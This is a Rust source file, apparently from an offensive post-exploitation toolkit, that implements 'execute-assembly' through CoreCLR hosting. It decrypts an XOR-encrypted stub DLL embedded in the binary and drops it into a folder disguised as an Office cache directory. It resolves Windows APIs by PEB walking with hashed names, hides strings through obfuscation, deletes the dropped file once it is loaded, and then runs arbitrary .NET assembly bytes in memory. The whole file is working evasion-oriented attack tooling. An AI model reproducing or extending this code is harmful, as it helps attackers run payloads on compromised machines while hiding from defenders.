//! End-to-end orchestrator: discovery → load coreclr → drop stub →
//! init → get delegate → delete stub → invoke target.

use alloc::format;
use alloc::string::String;
use alloc::vec::Vec;
use core::ffi::c_void;
use opsec_bootstrap::Bootstrap;
use opsec_peb::{resolve_export, resolve_module};
use opsec_strcrypt::{hash, obf};

use crate::discovery::{build_tpa_list, find_dotnet_root, find_highest_runtime};
use crate::stub_artifact::StubArtifact;

#[derive(Debug)]
pub enum Error {
    DotnetRootNotFound,
    RuntimeNotFound,
    CoreClrLoadFailed,
    ExportNotFound(&'static str),
    StubDropFailed,
    InitFailed(i32),
    CreateDelegateFailed(i32),
    StubReturned(i32),
}

/// Same 16-byte key as `stub/xor.py`. Editing one without the other
/// silently breaks decryption.
const STUB_KEY: [u8; 16] = [
    0xA9, 0x3F, 0x17, 0xC4, 0xEE, 0x0B, 0x8D, 0x51,
    0x22, 0x6A, 0x7F, 0x04, 0x9C, 0xB3, 0xE7, 0x56,
];

const STUB_XOR: &[u8] = include_bytes!(
    "../../../bofs/senjata-execute-assembly/assets/stub.dll.xor");

fn decrypt_stub() -> Vec<u8> {
    STUB_XOR.iter().enumerate()
        .map(|(i, b)| b ^ STUB_KEY[i % STUB_KEY.len()])
        .collect()
}

/// Invoke target assembly via the CoreCLR path.
///
/// # Safety
/// `asm_bytes` must be a valid managed PE; pointers passed to the stub
/// must outlive the invocation (call returns before this fn returns).
pub unsafe fn run(
    asm_bytes: &[u8],
    asm_args: &str,
    entry_point_flag: u32,
) -> Result<(), Error> {
    unsafe {
        let bs = Bootstrap::init().map_err(|_| Error::CoreClrLoadFailed)?;

        // 1. Discovery
        let dotnet_root = find_dotnet_root(&bs).ok_or(Error::DotnetRootNotFound)?;
        let runtime_ver = find_highest_runtime(&bs, &dotnet_root)
            .ok_or(Error::RuntimeNotFound)?;
        let runtime_dir = format!("{}\\shared\\Microsoft.NETCore.App\\{}",
                                  dotnet_root, runtime_ver);
        let coreclr_path = format!("{}\\coreclr.dll", runtime_dir);

        // 2. Load coreclr.dll via PEB-walk + kernelbase.LoadLibraryW
        load_coreclr(&coreclr_path)?;
        let coreclr = resolve_module(hash!("coreclr.dll"))
            .ok_or(Error::CoreClrLoadFailed)?;

        // 3. Build TPA list
        let mut tpa_list = build_tpa_list(&bs, &runtime_dir)
            .ok_or(Error::RuntimeNotFound)?;

        // 4. Drop the stub
        let temp_root = build_drop_root_dos();
        let artifact = StubArtifact::create(&bs, &temp_root, &decrypt_stub())
            .ok_or(Error::StubDropFailed)?;

        // Add stub path to TPA so coreclr can find it
        tpa_list.push(';');
        tpa_list.push_str(&artifact.dos_path);

        // 5. Resolve coreclr exports
        let init_addr = resolve_export(coreclr, hash!("coreclr_initialize"))
            .ok_or(Error::ExportNotFound("coreclr_initialize"))?;
        let cd_addr = resolve_export(coreclr, hash!("coreclr_create_delegate"))
            .ok_or(Error::ExportNotFound("coreclr_create_delegate"))?;
        let sd_addr = resolve_export(coreclr, hash!("coreclr_shutdown_2"))
            .ok_or(Error::ExportNotFound("coreclr_shutdown_2"))?;

        type InitFn = unsafe extern "system" fn(
            *const u8, *const u8, i32,
            *const *const u8, *const *const u8,
            *mut *mut c_void, *mut u32,
        ) -> i32;
        type CreateDelegateFn = unsafe extern "system" fn(
            *mut c_void, u32,
            *const u8, *const u8, *const u8,
            *mut *mut c_void,
        ) -> i32;
        type ShutdownFn = unsafe extern "system" fn(
            *mut c_void, u32, *mut i32,
        ) -> i32;
        type StubFn = unsafe extern "system" fn(
            *const u8, i32,
            *const u16, i32,
            i32,
        ) -> i32;

        let init: InitFn = core::mem::transmute::<*const (), InitFn>(init_addr);
        let create_delegate: CreateDelegateFn = core::mem::transmute::<*const (), CreateDelegateFn>(cd_addr);
        let shutdown: ShutdownFn = core::mem::transmute::<*const (), ShutdownFn>(sd_addr);

        // 6. Property table for coreclr_initialize
        let prop_tpa = obf!("TRUSTED_PLATFORM_ASSEMBLIES");
        let prop_apppaths = obf!("APP_PATHS");
        let prop_appni = obf!("APP_NI_PATHS");
        let prop_native = obf!("NATIVE_DLL_SEARCH_DIRECTORIES");
        let prop_gc = obf!("System.GC.Server");

        let tpa_cstr = cstr_owned(&tpa_list);
        let apppaths_cstr = cstr_owned(&artifact.dos_dir);
        let runtime_cstr = cstr_owned(&runtime_dir);

        // Property keys + values as null-terminated ANSI char* arrays
        let prop_keys_owned: [Vec<u8>; 5] = [
            cstr_from_slice(prop_tpa.as_bytes()),
            cstr_from_slice(prop_apppaths.as_bytes()),
            cstr_from_slice(prop_appni.as_bytes()),
            cstr_from_slice(prop_native.as_bytes()),
            cstr_from_slice(prop_gc.as_bytes()),
        ];
        let prop_vals_owned: [Vec<u8>; 5] = [
            tpa_cstr,
            apppaths_cstr.clone(),
            apppaths_cstr,
            runtime_cstr,
            b"false\0".to_vec(),
        ];
        let prop_keys: [*const u8; 5] = [
            prop_keys_owned[0].as_ptr(), prop_keys_owned[1].as_ptr(),
            prop_keys_owned[2].as_ptr(), prop_keys_owned[3].as_ptr(),
            prop_keys_owned[4].as_ptr(),
        ];
        let prop_vals: [*const u8; 5] = [
            prop_vals_owned[0].as_ptr(), prop_vals_owned[1].as_ptr(),
            prop_vals_owned[2].as_ptr(), prop_vals_owned[3].as_ptr(),
            prop_vals_owned[4].as_ptr(),
        ];

        // Use the current module path as exePath argument
        let exe_path_owned = current_module_ansi();
        let domain_name = obf!("Senjata");
        let domain_name_cstr = cstr_from_slice(domain_name.as_bytes());

        let mut host_handle: *mut c_void = core::ptr::null_mut();
        let mut domain_id: u32 = 0;
        let hr = init(
            exe_path_owned.as_ptr(),
            domain_name_cstr.as_ptr(),
            5,
            prop_keys.as_ptr(),
            prop_vals.as_ptr(),
            &mut host_handle,
            &mut domain_id,
        );
        if hr < 0 || host_handle.is_null() {
            return Err(Error::InitFailed(hr));
        }

        // 7. Get delegate to stub's Run method
        let stub_asm = obf!("SenjataLoader");
        let stub_type = obf!("SenjataLoader.Loader");
        let stub_method = obf!("Run");
        let stub_asm_c = cstr_from_slice(stub_asm.as_bytes());
        let stub_type_c = cstr_from_slice(stub_type.as_bytes());
        let stub_method_c = cstr_from_slice(stub_method.as_bytes());

        let mut stub_entry: *mut c_void = core::ptr::null_mut();
        let hr = create_delegate(
            host_handle, domain_id,
            stub_asm_c.as_ptr(),
            stub_type_c.as_ptr(),
            stub_method_c.as_ptr(),
            &mut stub_entry);
        if hr < 0 || stub_entry.is_null() {
            // Best-effort runtime shutdown
            let mut exit = 0i32;
            let _ = shutdown(host_handle, domain_id, &mut exit);
            return Err(Error::CreateDelegateFailed(hr));
        }

        // 8. Cleanup disk artifact NOW — coreclr has mmap'd the stub
        drop(artifact);

        // 9. Convert args to UTF-16 for marshalling
        let args_utf16: Vec<u16> = asm_args.encode_utf16().collect();

        let stub_fn: StubFn = core::mem::transmute::<*mut c_void, StubFn>(stub_entry);
        let rc = stub_fn(
            asm_bytes.as_ptr(), asm_bytes.len() as i32,
            args_utf16.as_ptr(), args_utf16.len() as i32,
            entry_point_flag as i32,
        );

        // 10. Best-effort shutdown
        let mut exit = 0i32;
        let _ = shutdown(host_handle, domain_id, &mut exit);

        if rc < 0 { Err(Error::StubReturned(rc)) } else { Ok(()) }
    }
}

/// Load coreclr.dll via PEB-walk + kernelbase.LoadLibraryW.
unsafe fn load_coreclr(coreclr_path: &str) -> Result<(), Error> {
    unsafe {
        if resolve_module(hash!("coreclr.dll")).is_some() {
            return Ok(());
        }
        let kbase = resolve_module(hash!("kernelbase.dll"))
            .ok_or(Error::ExportNotFound("kernelbase.dll"))?;
        let ll = resolve_export(kbase, hash!("LoadLibraryW"))
            .ok_or(Error::ExportNotFound("LoadLibraryW"))?;
        type Fn = unsafe extern "system" fn(*const u16) -> *mut c_void;
        let f: Fn = core::mem::transmute::<*const (), Fn>(ll);
        let mut path_w: Vec<u16> = coreclr_path.encode_utf16().collect();
        path_w.push(0);
        let h = f(path_w.as_ptr());
        if h.is_null() {
            Err(Error::CoreClrLoadFailed)
        } else {
            Ok(())
        }
    }
}

fn build_drop_root_dos() -> String {
    // %LOCALAPPDATA%\Microsoft\Windows\INetCache\Content.MSO
    let lad = unsafe { read_env_local_appdata() }
        .unwrap_or_else(|| String::from("C:\\Users\\Public"));
    format!("{}\\Microsoft\\Windows\\INetCache\\Content.MSO", lad)
}

unsafe fn read_env_local_appdata() -> Option<String> {
    unsafe {
        let kbase = resolve_module(hash!("kernelbase.dll"))?;
        let getenv = resolve_export(kbase, hash!("GetEnvironmentVariableW"))?;
        type Fn = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
        let f: Fn = core::mem::transmute::<*const (), Fn>(getenv);
        let name: Vec<u16> = "LOCALAPPDATA\0".encode_utf16().collect();
        let mut buf = [0u16; 512];
        let n = f(name.as_ptr(), buf.as_mut_ptr(), buf.len() as u32);
        if n == 0 || (n as usize) >= buf.len() { return None; }
        String::from_utf16(&buf[..n as usize]).ok()
    }
}

fn current_module_ansi() -> Vec<u8> {
    // Best-effort; if anything fails, use "senjata" as a placeholder.
    // CoreCLR uses this only for diagnostic strings.
    let mut v = b"senjata.exe\0".to_vec();
    unsafe {
        if let Some(kbase) = resolve_module(hash!("kernelbase.dll")) {
            if let Some(gmf) = resolve_export(kbase, hash!("GetModuleFileNameA")) {
                type Fn = unsafe extern "system" fn(*mut c_void, *mut u8, u32) -> u32;
                let f: Fn = core::mem::transmute::<*const (), Fn>(gmf);
                let mut buf = [0u8; 260];
                let n = f(core::ptr::null_mut(), buf.as_mut_ptr(), buf.len() as u32);
                if n > 0 && (n as usize) < buf.len() {
                    v.clear();
                    v.extend_from_slice(&buf[..n as usize]);
                    v.push(0);
                }
            }
        }
    }
    v
}

fn cstr_owned(s: &str) -> Vec<u8> {
    let mut v = Vec::with_capacity(s.len() + 1);
    v.extend_from_slice(s.as_bytes());
    v.push(0);
    v
}

fn cstr_from_slice(bytes: &[u8]) -> Vec<u8> {
    let mut v = Vec::with_capacity(bytes.len() + 1);
    v.extend_from_slice(bytes);
    v.push(0);
    v
}
